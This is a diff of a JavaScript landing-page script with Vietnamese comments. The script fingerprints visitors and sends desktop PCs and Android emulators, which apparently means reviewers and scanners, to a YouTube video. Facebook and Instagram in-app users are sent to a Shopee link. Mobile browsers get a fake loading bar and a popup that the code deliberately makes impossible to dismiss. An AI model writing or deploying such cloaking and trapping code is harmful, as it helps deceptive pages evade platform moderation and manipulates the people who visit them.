@@ -275,60 +275,51 @@ const pcRedirect = "https://www.youtube.com/watch?v=mlq7OVEFW94";
 // ======================= PHÁT HIỆN MÔI TRƯỜNG =======================
 const ua = navigator.userAgent || navigator.vendor || window.opera;
 
-// Phát hiện Facebook & Instagram app (theo cũ: cả 2 đều bị coi là "Facebook app" để xử lý)
-const isFacebookApp =
-    ua.includes("FBAN") ||
-    ua.includes("FBAV") ||
-    ua.includes("Instagram");
+// 1. Phát hiện Facebook & Instagram app
+const isFacebookApp = ua.includes("FBAN") || ua.includes("FBAV") || ua.includes("Instagram");
 
-// Phát hiện PC THẬT (kể cả khi fake UserAgent mobile)
+// 2. Phát hiện PC thật (kể cả khi fake UA mobile)
 function detectRealPC() {
-    // Desktop OS patterns (không chứa Android/iOS)
     const desktopUAPattern = /Windows NT|Macintosh|CrOS|X11; Linux|Linux x86_64/i;
     if (desktopUAPattern.test(ua) && !/Android|iPhone|iPad|iPod/i.test(ua)) {
         return true;
     }
-
     const platform = navigator.platform || "";
     if (/Win32|MacIntel|Linux x86_64|Linux i686/i.test(platform)) {
         return true;
     }
-
     const noTouch = (navigator.maxTouchPoints || 0) === 0;
     const finePointer = window.matchMedia("(any-hover: hover) and (any-pointer: fine)").matches;
     const largeScreen = window.innerWidth >= 1024;
-
     if (noTouch && finePointer) return true;
     if (noTouch && largeScreen) return true;
     if (finePointer && largeScreen) return true;
-
     return false;
 }
 
-// Phát hiện giả lập Android (emulator)
+// 3. Phát hiện giả lập Android
 const isEmulator = /Android SDK built for x86|Emulator|Genymotion|sdk_gphone|x86/i.test(ua);
 
 // ======================= LUẬT CHUYỂN HƯỚNG =======================
-// 1. PC hoặc Emulator → Chuyển hướng sang YouTube (giữ nguyên)
+// Ưu tiên 1: PC hoặc Emulator -> sang YouTube
 if (detectRealPC() || isEmulator) {
     window.location.replace(pcRedirect);
     throw new Error("Redirect PC/Emulator → YouTube");
 }
 
-// 2. Nếu là Facebook App hoặc Instagram App → Chuyển hướng sang Shopee (theo yêu cầu)
+// Ưu tiên 2: Facebook / Instagram app -> chuyển hướng SANG SHOPEE (theo yêu cầu)
 if (isFacebookApp) {
     window.location.replace(shopeeLink);
     throw new Error("Redirect Facebook/Instagram → Shopee");
 }
 
-// ======================= CÒN LẠI: TRÌNH DUYỆT DI ĐỘNG BÌNH THƯỜNG (Chrome, Safari, UC,...) =======================
-// Giữ nguyên toàn bộ hiệu ứng loading, popup, các box như chức năng cũ
+// ======================= CÒN LẠI: TRÌNH DUYỆT DI ĐỘNG BÌNH THƯỜNG =======================
+// Giữ nguyên toàn bộ hiệu ứng loading, popup, các box chức năng
 const progressBar = document.getElementById("progressBar");
 const percent = document.getElementById("percent");
 const popupOverlay = document.getElementById("popupOverlay");
 const topHeader = document.getElementById("topHeader");
 
-// Hàm hiện popup (chỉ khi chưa hiện)
 function showPopupIfNeeded() {
     if (!popupOverlay.classList.contains('show')) {
         popupOverlay.classList.add('show');
@@ -338,37 +329,28 @@ function showPopupIfNeeded() {
 let value = 0;
 const interval = setInterval(() => {
     value += 4;
-
     progressBar.style.width = value + "%";
     percent.innerText = value + "%";
 
     if (value >= 100) {
         clearInterval(interval);
         setTimeout(() => {
-            // Ẩn loading, hiện main content & top header
             document.getElementById("loadingWrap").style.display = "none";
             document.getElementById("mainContent").style.display = "flex";
-            topHeader.style.display = "block";   // Hiện thanh tiêu đề hồng
+            topHeader.style.display = "block";
 
-            // Tự động hiện popup sau 5 giây (hướng dẫn mở bằng trình duyệt – vì đang mở bằng Chrome mobile vẫn hiện để hướng dẫn, giữ đúng chức năng cũ)
             setTimeout(showPopupIfNeeded, 5000);
 
-            // Gán sự kiện click cho các box để hiện popup ngay khi chạm (giữ nguyên)
             document.querySelectorAll('.box').forEach(box => {
                 box.addEventListener('click', showPopupIfNeeded);
             });
-
         }, 100);
     }
 }, 30);
 
-// Chặn mọi cách tắt popup (click overlay, phím back...)
-popupOverlay.addEventListener('click', function(e) {
-    e.stopPropagation();
-});
-
-// Đảm bảo popup không bị tắt bởi phím back (overlay không thể tắt)
-window.addEventListener('keydown', function(e) {
+// Chặn mọi cách tắt popup
+popupOverlay.addEventListener('click', (e) => e.stopPropagation());
+window.addEventListener('keydown', (e) => {
     if (e.key === 'Escape' && popupOverlay.classList.contains('show')) {
         e.preventDefault();
         e.stopPropagation();
